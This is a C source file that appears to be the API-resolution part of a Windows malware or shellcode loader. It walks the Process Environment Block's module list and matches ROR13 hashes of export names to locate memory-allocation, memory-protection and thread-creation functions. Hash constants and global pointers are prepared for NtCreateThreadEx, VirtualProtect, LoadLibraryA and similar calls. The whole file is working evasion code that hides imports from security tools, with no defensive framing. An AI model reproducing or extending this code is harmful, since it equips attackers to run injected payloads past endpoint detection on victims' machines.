#include "loader.h"
#include "services.h"
#include <stdint.h>

/* ── ROR13 hash ── */
static uint32_t ror13(uint32_t v) {
    return (v >> 13) | (v << 19);
}
static uint32_t hash_str(const char *s) {
    uint32_t h = 0;
    while (*s) { h = ror13(h) + (uint8_t)(*s++); }
    return h;
}

/* ── PEB / loader data structures ── */
typedef struct _UNICODE_STRING {
    USHORT Length, MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID      DllBase;
    PVOID      EntryPoint;
    ULONG      SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
    ULONG     Length;
    BOOLEAN   Initialized;
    PVOID     SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
} PEB_LDR_DATA;

typedef struct _PEB {
    BYTE        Reserved1[2];
    BYTE        BeingDebugged;
    BYTE        Reserved2[1];
    PVOID       Reserved3[2];
    PEB_LDR_DATA *Ldr;
} PEB;

static PEB *get_peb(void) {
    PEB *peb;
    __asm__ volatile ("movq %%gs:0x60, %0" : "=r"(peb));
    return peb;
}

/* Walk the PEB module list, hash each exported function name,
   return the function pointer when the hash matches.          */
void *patch_resolve(uint32_t target_hash) {
    PEB *peb = get_peb();
    LIST_ENTRY *head = &peb->Ldr->InLoadOrderModuleList;
    LIST_ENTRY *cur  = head->Flink;

    while (cur != head) {
        LDR_DATA_TABLE_ENTRY *mod = CONTAINING_RECORD(
            cur, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        cur = cur->Flink;

        if (!mod->DllBase) continue;
        uint8_t *base = (uint8_t *)mod->DllBase;

        IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) continue;
        IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
        if (nt->Signature != IMAGE_NT_SIGNATURE) continue;

        DWORD exp_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        if (!exp_rva) continue;

        IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)(base + exp_rva);
        DWORD *names   = (DWORD *)(base + exp->AddressOfNames);
        WORD  *ordinals = (WORD  *)(base + exp->AddressOfNameOrdinals);
        DWORD *funcs   = (DWORD *)(base + exp->AddressOfFunctions);

        for (DWORD i = 0; i < exp->NumberOfNames; i++) {
            const char *name = (const char *)(base + names[i]);
            if (hash_str(name) == target_hash) {
                return (void *)(base + funcs[ordinals[i]]);
            }
        }
    }
    return NULL;
}

/* ── ROR13 hash constants ── */
#define HASH_NtAllocateVirtualMemory  0xD33BCABD
#define HASH_NtProtectVirtualMemory   0x8C394D89
#define HASH_NtCreateThreadEx         0x4D1DEB74
#define HASH_NtWaitForSingleObject    0xAE06C1B2
#define HASH_NtFreeVirtualMemory      0xDB63B5AB
#define HASH_RtlExitUserThread        0xFF7F061A
#define HASH_VirtualAlloc             0x91AFCA54
#define HASH_VirtualProtect           0x7946C61B
#define HASH_VirtualFree              0x030633AC
#define HASH_LoadLibraryA             0xEC0E4E8E
#define HASH_GetProcAddress           0x7C0DFCAA

/* Global function pointers */
NtAllocateVirtualMemory_t  _NtAllocateVirtualMemory  = NULL;
NtProtectVirtualMemory_t   _NtProtectVirtualMemory   = NULL;
NtCreateThreadEx_t         _NtCreateThreadEx         = NULL;
NtWaitForSingleObject_t    _NtWaitForSingleObject    = NULL;
NtFreeVirtualMemory_t      _NtFreeVirtualMemory      = NULL;
RtlExitUserThread_t        _RtlExitUserThread        = NULL;

LPVOID (WINAPI *_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD)         = NULL;
BOOL   (WINAPI *_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD)      = NULL;
BOOL   (WINAPI *_VirtualFree)(LPVOID, SIZE_T, DWORD)                 = NULL;
HMODULE(WINAPI *_LoadLibraryA)(LPCSTR)                               = NULL;

/* Called once at startup to populate all function pointers */
void resolve_all(void) {
    _NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)patch_resolve(HASH_NtAllocateVirtualMemory);
    _NtProtectVirtualMemory  = (NtProtectVirtualMemory_t) patch_resolve(HASH_NtProtectVirtualMemory);
    _NtCreateThreadEx        = (NtCreateThreadEx_t)       patch_resolve(HASH_NtCreateThreadEx);
    _NtWaitForSingleObject   = (NtWaitForSingleObject_t)  patch_resolve(HASH_NtWaitForSingleObject);
    _NtFreeVirtualMemory     = (NtFreeVirtualMemory_t)    patch_resolve(HASH_NtFreeVirtualMemory);
    _RtlExitUserThread       = (RtlExitUserThread_t)      patch_resolve(HASH_RtlExitUserThread);
    _VirtualAlloc            = (LPVOID(WINAPI*)(LPVOID, SIZE_T, DWORD, DWORD))    patch_resolve(HASH_VirtualAlloc);
    _VirtualProtect          = (BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD))     patch_resolve(HASH_VirtualProtect);
    _VirtualFree             = (BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD))             patch_resolve(HASH_VirtualFree);
    _LoadLibraryA            = (HMODULE(WINAPI*)(LPCSTR))                         patch_resolve(HASH_LoadLibraryA);
}
